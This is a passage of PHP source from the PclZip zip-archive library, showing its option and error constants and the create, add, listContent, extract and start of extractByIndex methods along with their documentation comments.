  define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
  define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
  define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
  define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
  define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
  define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

  // ----- Options values
  define( 'PCLZIP_OPT_PATH', 77001 );
  define( 'PCLZIP_OPT_ADD_PATH', 77002 );
  define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
  define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
  define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
  define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
  define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
  define( 'PCLZIP_OPT_BY_NAME', 77008 );
  define( 'PCLZIP_OPT_BY_INDEX', 77009 );
  define( 'PCLZIP_OPT_BY_EREG', 77010 );
  define( 'PCLZIP_OPT_BY_PREG', 77011 );
  define( 'PCLZIP_OPT_COMMENT', 77012 );
  define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
  define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
  define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
  define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
  define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
  // Having big trouble with crypt. Need to multiply 2 long int
  // which is not correctly supported by PHP ...
  //define( 'PCLZIP_OPT_CRYPT', 77018 );
  define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
  
  // ----- File description attributes
  define( 'PCLZIP_ATT_FILE_NAME', 79001 );
  define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
  define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
  define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
  define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
  define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

  // ----- Call backs values
  define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
  define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
  define( 'PCLZIP_CB_PRE_ADD', 78003 );
  define( 'PCLZIP_CB_POST_ADD', 78004 );
  /* For futur use
  define( 'PCLZIP_CB_PRE_LIST', 78005 );
  define( 'PCLZIP_CB_POST_LIST', 78006 );
  define( 'PCLZIP_CB_PRE_DELETE', 78007 );
  define( 'PCLZIP_CB_POST_DELETE', 78008 );
  */

  // --------------------------------------------------------------------------------
  // Class : PclZip
  // Description :
  //   PclZip is the class that represent a Zip archive.
  //   The public methods allow the manipulation of the archive.
  // Attributes :
  //   Attributes must not be accessed directly.
  // Methods :
  //   PclZip() : Object creator
  //   create() : Creates the Zip archive
  //   listContent() : List the content of the Zip archive
  //   extract() : Extract the content of the archive
  //   properties() : List the properties of the archive
  // --------------------------------------------------------------------------------
  class PclZip
  {
    // ----- Filename of the zip file
    var $zipname = '';

    // ----- File descriptor of the zip file
    var $zip_fd = 0;

    // ----- Internal error handling
    var $error_code = 1;
    var $error_string = '';
    
    // ----- Current status of the magic_quotes_runtime
    // This value store the php configuration for magic_quotes
    // The class can then disable the magic_quotes and reset it after
    var $magic_quotes_status;

  // --------------------------------------------------------------------------------
  // Function : PclZip()
  // Description :
  //   Creates a PclZip object and set the name of the associated Zip archive
  //   filename.
  //   Note that no real action is taken, if the archive does not exist it is not
  //   created. Use create() for that.
  // --------------------------------------------------------------------------------
  function PclZip($p_zipname)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");

    // ----- Tests the zlib
    if (!function_exists('gzopen'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 1, "zlib extension seems to be missing");
      die('Abort '.basename(__FILE__).' : Missing zlib extensions');
    }

    // ----- Set the attributes
    $this->zipname = $p_zipname;
    $this->zip_fd = 0;
    $this->magic_quotes_status = -1;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);
    return;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   create($p_filelist, $p_add_dir="", $p_remove_dir="")
  //   create($p_filelist, $p_option, $p_option_value, ...)
  // Description :
  //   This method supports two different synopsis. The first one is historical.
  //   This method creates a Zip Archive. The Zip file is created in the
  //   filesystem. The files and directories indicated in $p_filelist
  //   are added in the archive. See the parameters description for the
  //   supported format of $p_filelist.
  //   When a directory is in the list, the directory and its content is added
  //   in the archive.
  //   In this synopsis, the function takes an optional variable list of
  //   options. See bellow the supported options.
  // Parameters :
  //   $p_filelist : An array containing file or directory names, or
  //                 a string containing one filename or one directory name, or
  //                 a string containing a list of filenames and/or directory
  //                 names separated by spaces.
  //   $p_add_dir : A path to add before the real path of the archived file,
  //                in order to have it memorized in the archive.
  //   $p_remove_dir : A path to remove from the real path of the file to archive,
  //                   in order to have a shorter path memorized in the archive.
  //                   When $p_add_dir and $p_remove_dir are set, $p_remove_dir
  //                   is removed first, before $p_add_dir is added.
  // Options :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_COMMENT :
  //   PCLZIP_CB_PRE_ADD :
  //   PCLZIP_CB_POST_ADD :
  // Return Values :
  //   0 on failure,
  //   The list of the added files, with a status of the add action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function create($p_filelist)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::create', "filelist='$p_filelist', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Set default values
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove from the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options detected");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional'
                                                   //, PCLZIP_OPT_CRYPT => 'optional'
                                             ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                       "Invalid number / type of arguments");
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Init
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    
    // ----- Look if the $p_filelist is really an array
    if (is_array($p_filelist)) {
    
      // ----- Look if the first element is also an array
      //       This will mean that this is a file description entry
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      }
      
      // ----- The list is a list of string names
      else {
        $v_string_list = $p_filelist;
      }
    }

    // ----- Look if the $p_filelist is a string
    else if (is_string($p_filelist)) {
      // ----- Create a list from the string
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    }

    // ----- Invalid variable type for $p_filelist
    else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }
    
    // ----- Reformat the string list
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        if ($v_string != '') {
          $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Ignore an empty filename");
        }
      }
    }
    
    // ----- For each file in the list check the attributes
    $v_supported_attributes
    = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
             ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
             ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
             ,PCLZIP_ATT_FILE_MTIME => 'optional'
             ,PCLZIP_ATT_FILE_CONTENT => 'optional'
             ,PCLZIP_ATT_FILE_COMMENT => 'optional'
                                                );
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry,
                                               $v_filedescr_list[],
                                               $v_options,
                                               $v_supported_attributes);
      if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }
    }

    // ----- Expand the filelist (expand directories)
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Call the create fct
    $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_result_list);
    return $p_result_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   add($p_filelist, $p_add_dir="", $p_remove_dir="")
  //   add($p_filelist, $p_option, $p_option_value, ...)
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This methods add the list of files in an existing archive.
  //   If a file with the same name already exists, it is added at the end of the
  //   archive, the first one is still present.
  //   If the archive does not exist, it is created.
  // Parameters :
  //   $p_filelist : An array containing file or directory names, or
  //                 a string containing one filename or one directory name, or
  //                 a string containing a list of filenames and/or directory
  //                 names separated by spaces.
  //   $p_add_dir : A path to add before the real path of the archived file,
  //                in order to have it memorized in the archive.
  //   $p_remove_dir : A path to remove from the real path of the file to archive,
  //                   in order to have a shorter path memorized in the archive.
  //                   When $p_add_dir and $p_remove_dir are set, $p_remove_dir
  //                   is removed first, before $p_add_dir is added.
  // Options :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_COMMENT :
  //   PCLZIP_OPT_ADD_COMMENT :
  //   PCLZIP_OPT_PREPEND_COMMENT :
  //   PCLZIP_CB_PRE_ADD :
  //   PCLZIP_CB_POST_ADD :
  // Return Values :
  //   0 on failure,
  //   The list of the added files, with a status of the add action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function add($p_filelist)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::add', "filelist='$p_filelist', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Set default values
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove form the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options detected");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional',
                                                   PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                   PCLZIP_OPT_PREPEND_COMMENT => 'optional'
                                                   //, PCLZIP_OPT_CRYPT => 'optional'
                                                                                                   ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Init
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    
    // ----- Look if the $p_filelist is really an array
    if (is_array($p_filelist)) {
    
      // ----- Look if the first element is also an array
      //       This will mean that this is a file description entry
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      }
      
      // ----- The list is a list of string names
      else {
        $v_string_list = $p_filelist;
      }
    }

    // ----- Look if the $p_filelist is a string
    else if (is_string($p_filelist)) {
      // ----- Create a list from the string
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    }

    // ----- Invalid variable type for $p_filelist
    else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }
    
    // ----- Reformat the string list
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
    }
    
    // ----- For each file in the list check the attributes
    $v_supported_attributes
    = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
             ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
             ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
             ,PCLZIP_ATT_FILE_MTIME => 'optional'
             ,PCLZIP_ATT_FILE_CONTENT => 'optional'
             ,PCLZIP_ATT_FILE_COMMENT => 'optional'
                                                );
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry,
                                               $v_filedescr_list[],
                                               $v_options,
                                               $v_supported_attributes);
      if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }
    }

    // ----- Expand the filelist (expand directories)
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Call the create fct
    $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_result_list);
    return $p_result_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : listContent()
  // Description :
  //   This public method, gives the list of the files and directories, with their
  //   properties.
  //   The properties of each entries in the list are (used also in other functions) :
  //     filename : Name of the file. For a create or add action it is the filename
  //                given by the user. For an extract function it is the filename
  //                of the extracted file.
  //     stored_filename : Name of the file / directory stored in the archive.
  //     size : Size of the stored file.
  //     compressed_size : Size of the file's data compressed in the archive
  //                       (without the headers overhead)
  //     mtime : Last known modification date of the file (UNIX timestamp)
  //     comment : Comment associated with the file
  //     folder : true | false
  //     index : index of the file in the archive
  //     status : status of the action (depending of the action) :
  //              Values are :
  //                ok : OK !
  //                filtered : the file / dir is not extracted (filtered by user)
  //                already_a_directory : the file can not be extracted because a
  //                                      directory with the same name already exists
  //                write_protected : the file can not be extracted because a file
  //                                  with the same name already exists and is
  //                                  write protected
  //                newer_exist : the file was not extracted because a newer file exists
  //                path_creation_fail : the file is not extracted because the folder
  //                                     does not exists and can not be created
  //                write_error : the file was not extracted because there was a
  //                              error while writing the file
  //                read_error : the file was not extracted because there was a error
  //                             while reading the file
  //                invalid_header : the file was not extracted because of an archive
  //                                 format error (bad file header)
  //   Note that each time a method can continue operating when there
  //   is an action error on a file, the error is only logged in the file status.
  // Return Values :
  //   0 on an unrecoverable failure,
  //   The list of the files in the archive.
  // --------------------------------------------------------------------------------
  function listContent()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::listContent', "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Call the extracting fct
    $p_list = array();
    if (($v_result = $this->privList($p_list)) != 1)
    {
      unset($p_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   extract($p_path="./", $p_remove_path="")
  //   extract([$p_option, $p_option_value, ...])
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This method extract all the files / directories from the archive to the
  //   folder indicated in $p_path.
  //   If you want to ignore the 'root' part of path of the memorized files
  //   you can indicate this in the optional $p_remove_path parameter.
  //   By default, if a newer file with the same name already exists, the
  //   file is not extracted.
  //
  //   If both PCLZIP_OPT_PATH and PCLZIP_OPT_ADD_PATH aoptions
  //   are used, the path indicated in PCLZIP_OPT_ADD_PATH is append
  //   at the end of the path value of PCLZIP_OPT_PATH.
  // Parameters :
  //   $p_path : Path where the files and directories are to be extracted
  //   $p_remove_path : First part ('root' part) of the memorized path
  //                    (if any similar) to remove while extracting.
  // Options :
  //   PCLZIP_OPT_PATH :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_CB_PRE_EXTRACT :
  //   PCLZIP_CB_POST_EXTRACT :
  // Return Values :
  //   0 or a negative value on failure,
  //   The list of the extracted files, with a status of the action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function extract()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::extract", "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();
//    $v_path = "./";
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Default values for option
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

    // ----- Look for arguments
    if ($v_size > 0) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_BY_NAME => 'optional',
                                                   PCLZIP_OPT_BY_EREG => 'optional',
                                                   PCLZIP_OPT_BY_PREG => 'optional',
                                                   PCLZIP_OPT_BY_INDEX => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional'
                                                                                                    ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }

        // ----- Set the arguments
        if (isset($v_options[PCLZIP_OPT_PATH])) {
          $v_path = $v_options[PCLZIP_OPT_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          // ----- Check for '/' in last path char
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
            $v_path .= '/';
          }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_path = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "path='$v_path', remove_path='$v_remove_path', remove_all_path='".($v_remove_path?'true':'false')."'");

    // ----- Call the extracting fct
    $p_list = array();
    $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                             $v_remove_all_path, $v_options);
    if ($v_result < 1) {
      unset($p_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------


  // --------------------------------------------------------------------------------
  // Function :
  //   extractByIndex($p_index, $p_path="./", $p_remove_path="")
  //   extractByIndex($p_index, [$p_option, $p_option_value, ...])
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This method is doing a partial extract of the archive.
  //   The extracted files or folders are identified by their index in the
  //   archive (from 0 to n).
  //   Note that if the index identify a folder, only the folder entry is
  //   extracted, not all the files included in the archive.
  // Parameters :
  //   $p_index : A single index (integer) or a string of indexes of files to
  //              extract. The form of the string is "0,4-6,8-12" with only numbers
  //              and '-' for range or ',' to separate ranges. No spaces or ';'
  //              are allowed.
  //   $p_path : Path where the files and directories are to be extracted
  //   $p_remove_path : First part ('root' part) of the memorized path
  //                    (if any similar) to remove while extracting.
  // Options :
  //   PCLZIP_OPT_PATH :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_EXTRACT_AS_STRING : The files are extracted as strings and
  //     not as files.
  //     The resulting content is in a new field 'content' in the file
  //     structure.
  //     This option must be used alone (any other options are ignored).
  //   PCLZIP_CB_PRE_EXTRACT :
  //   PCLZIP_CB_POST_EXTRACT :
  // Return Values :
  //   0 on failure,
  //   The list of the extracted files, with a status of the action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  //function extractByIndex($p_index, options...)
  function extractByIndex($p_index)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::extractByIndex", "index='$p_index', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();
//    $v_path = "./";
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Default values for option
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove form the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional'
                                                                                                   ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }

        // ----- Set the arguments
        if (isset($v_options[PCLZIP_OPT_PATH])) {
          $v_path = $v_options[PCLZIP_OPT_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          // ----- Check for '/' in last path char
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
            $v_path .= '/';
          }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
        if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
          $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Option PCLZIP_OPT_EXTRACT_AS_STRING not set.");
        }
        else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Option PCLZIP_OPT_EXTRACT_AS_STRING set.");
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_path = $v_arg_list[0];

